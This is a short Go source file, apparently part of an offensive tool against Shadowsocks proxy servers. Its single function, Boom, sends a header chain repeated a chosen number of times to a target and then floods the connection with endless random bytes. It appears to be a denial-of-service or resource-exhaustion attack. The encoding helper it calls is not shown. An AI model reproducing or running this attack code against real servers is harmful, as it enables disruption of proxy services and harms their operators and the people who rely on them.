package shadowsocks

import (
	"crypto/rand"
	"io"

	"github.com/AkinoKaede/sstreamcry/common/internet"
	"github.com/AkinoKaede/sstreamcry/common/net"
)

func Boom(dest net.Destination, account Account, times int) error {
	data := EncodeHeaderChain(dest, account, times)
	conn, err := internet.DialTCP(dest)
	if err != nil {
		return err
	}
	defer conn.Close()

	if _, err := conn.Write(data); err != nil {
		return err
	}

	if _, err := io.Copy(conn, rand.Reader); err != nil {
		return err
	}

	return nil
}
